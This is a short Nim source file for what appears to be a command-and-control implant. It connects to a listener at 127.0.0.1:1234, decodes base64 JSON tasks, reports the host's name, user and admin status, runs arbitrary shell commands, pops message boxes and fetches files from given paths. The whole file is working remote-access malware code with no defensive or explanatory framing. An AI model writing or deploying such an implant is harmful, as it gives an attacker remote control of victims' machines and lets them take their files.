import net, osproc, os, base64, json

import modules, communication

import ../commands/[shell, msgbox, download]

let client: Socket = newSocket()
client.connect("127.0.0.1", Port(1234))

proc receiveCommands(client: Socket) =
    client.connectToC2()
    while true:
        let line = client.recvLine()

        if line.len == 0:
            echo "server down"
            quit(0)

        let task = decode(line)

        let jsonNode = parseJson(task)
        case jsonNode["task"].getStr():
        of "identify":
            client.identify(
                hostname=hostname(),
                username=username(), 
                isAdmin=areWeAdmin()
            )
        of "shell": 
            let toExec = jsonNode["shellCmd"].getStr()
            shell.executeTask(client, toExec)
        of "msgbox":
            msgbox.executeTask(client, jsonNode["title"].getStr(), jsonNode["caption"].getStr())
        of "download":
            download.executeTask(client, jsonNode["path"].getStr())

receiveCommands(client)
  
client.close()
